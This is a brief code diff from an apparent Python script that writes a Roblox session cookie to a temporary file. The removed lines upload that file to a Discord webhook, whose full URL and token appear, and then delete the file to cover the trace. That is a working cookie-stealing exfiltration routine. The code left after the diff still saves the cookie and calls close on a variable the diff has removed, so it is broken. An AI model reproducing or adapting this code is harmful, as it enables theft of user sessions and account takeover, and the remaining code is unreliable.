@@ -30,13 +30,5 @@ cookie_file = os.path.join(temp_dir, "roblox_cookie.txt")
 with open(cookie_file, "w") as file:
     file.write(cookie_value)
 
-# Send file to Discord webhook
-webhook_url = "https://discord.com/api/webhooks/1116339688815464508/1_DFXDIh15XKmksLJIyTUE8d8xYKd0Fz3mxb9d9VKsBcfCof6qunsUxE9FyClaaFUcNp"
-files = {"file": open(cookie_file, "rb")}
-response = requests.post(webhook_url, files=files)
-
 # Close the file
 files["file"].close()
-
-# Delete the cookie file
-os.remove(cookie_file)
